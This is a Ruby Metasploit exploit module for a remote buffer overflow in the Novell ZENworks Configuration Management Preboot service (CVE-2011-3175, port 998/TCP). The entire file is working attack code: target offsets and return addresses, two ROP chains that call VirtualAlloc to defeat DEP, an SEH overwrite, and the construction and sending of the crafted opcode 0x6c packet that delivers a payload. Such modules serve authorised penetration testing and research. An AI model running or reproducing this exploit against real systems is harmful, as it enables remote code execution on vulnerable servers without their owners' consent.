##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell ZENworks Configuration Management Preboot Service 0x6c Buffer Overflow',
			'Description'    => %q{
					This module exploits a remote buffer overflow in the ZENworks Configuration
				Management. The vulnerability exists in the Preboot service and can be triggered by
				sending a specially crafted packet with the opcode 0x6c (PROXY_CMD_GET_NEXT_STEP)
				to port 998/TCP. The module has been successfully tested on Novell ZENworks
				Configuration Management 10 SP2 / SP3 and Windows Server 2003 SP2 (DEP bypass).
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Luigi Auriemma', # Vulnerability Discovery
					'juan' # Metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2011-3175' ],
					[ 'OSVDB', '80231' ],
					[ 'BID', '52659' ],
					[ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=973' ],
					[ 'URL', 'http://support.novell.com/docs/Readmes/InfoDocument/patchbuilder/readme_5127930.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Payload'        =>
				{
					'BadChars' => "\x00",
					'Space'=> 990,
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xC4\x54\xF2\xFF\xFF" # add esp, -3500
				},
			'Platform'       => ['win'],
			'Targets'        =>
				[
					[ 'Novell ZENworks Configuration Management 10 SP3 / Windows 2003 SP2',
						{
							'Offset'            => 1100,
							'OffsetBottomStack' => 1148,
							'OffsetRop'         => 4,
							'Ret'               => 0x10024b8c # add esp, 1204 # ret from zenimgweb.dll
						}
					],
					[ 'Novell ZENworks Configuration Management 10 SP2 / Windows 2003 SP2',
						{
							'Offset'            => 1100,
							'OffsetBottomStack' => 1148,
							'OffsetRop'         => 4,
							'Ret'               => 0x10024a7c # add esp, 1204 # ret from zenimgweb.dll
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Feb 22 2012',
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(998)], self.class)
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V").first
	end

	def nop
		return make_nops(4).unpack("L")[0].to_i
	end

	# rop chain generated with mona.py
	def create_rop_chain()


		if target.name =~ /Novell ZENworks Configuration Management 10 SP3/
			rop_gadgets =
				[
					0x100066b1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll]
					0x00001000, # 0x00001000-> edx
					0x100239df, # POP ECX # RETN [zenimgweb.dll]
					0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll]
					0x10018653, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll]
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					0x1002a38f, # PUSH EAX # POP ESI # RETN [zenimgweb.dll]
					0x00423ddd, # POP EBP # RETN [novell-pbserv.exe]
					0x10007b22, # & push esp #  ret  [zenimgweb.dll]
					0x100235dc, # POP EBX # RETN [zenimgweb.dll]
					0x00000001, # 0x00000001-> ebx
					0x0041961a, # POP ECX # RETN [novell-pbserv.exe]
					0x00000040, # 0x00000040-> ecx
					0x1004702b, # POP EDI # RETN [zenimgweb.dll]
					0x1001d001, # RETN (ROP NOP) [zenimgweb.dll]
					0x10011217, # POP EAX # RETN [zenimgweb.dll]
					nop,
					0x10018ec8, # PUSHAD # RETN [zenimgweb.dll]
				].pack("V*")
		else # Novell ZENworks Configuration Management 10 SP2
			rop_gadgets =
				[
					0x100065d1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll]
					0x00001000, # 0x00001000-> edx
					0x10062113, # POP ECX # RETN [zenimgweb.dll]
					0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll]
					0x10018553, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll]
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					junk,       # Filler (compensate)
					0x10016818, # PUSH EAX # POP ESI # RETN [zenimgweb.dll]
					0x1002fd05, # POP EBP # RETN [zenimgweb.dll]
					0x10043053, # & push esp #  ret  [zenimgweb.dll]
					0x1003cbf8, # POP EBX # RETN [zenimgweb.dll]
					0x00000001, # 0x00000001-> ebx
					0x00423eeb, # POP ECX # RETN [novell-pbserv.exe]
					0x00000040, # 0x00000040-> ecx
					0x1003173e, # POP EDI # RETN [zenimgweb.dll]
					0x10020801, # RETN (ROP NOP) [zenimgweb.dll]
					0x00406b58, # POP EAX # RETN [novell-pbserv.exe]
					nop,
					0x1006d1e6, # PUSHAD # RETN [zenimgweb.dll]
				].pack("V*")
		end

		return rop_gadgets
	end


	def exploit
		connect

		buf = rand_text(4)
		buf2 = rand_text(4)
		buf3 = rand_text(4)
		buf4 = rand_text(4)

		buf5 = rand_text(target['OffsetRop'])
		buf5 << create_rop_chain
		buf5 << payload.encoded
		buf5 << rand_text(target['Offset'] - buf5.length)
		buf5 << generate_seh_record(target.ret)
		buf5 << rand_text(target['OffsetBottomStack'] - buf4.length)

		my_buf = ""
		buf5.unpack("C*").each {|b|
			my_buf << [b].pack("C")
			my_buf << rand_text(1)
		}

		packet =  [0x6c].pack("N") # Opcode 0x6c
		packet << [buf.length].pack("N") # Length
		packet << buf # Value
		packet << [buf2.length].pack("N") # Length
		packet << buf2 # Value
		packet << [buf3.length].pack("N") # Length
		packet << buf3 # Value
		packet << [buf4.length].pack("N") # Length
		packet << buf4 # Value
		packet << [my_buf.length].pack("N") # Length
		packet << my_buf # Value
		sock.put(packet)

		disconnect
	end
end
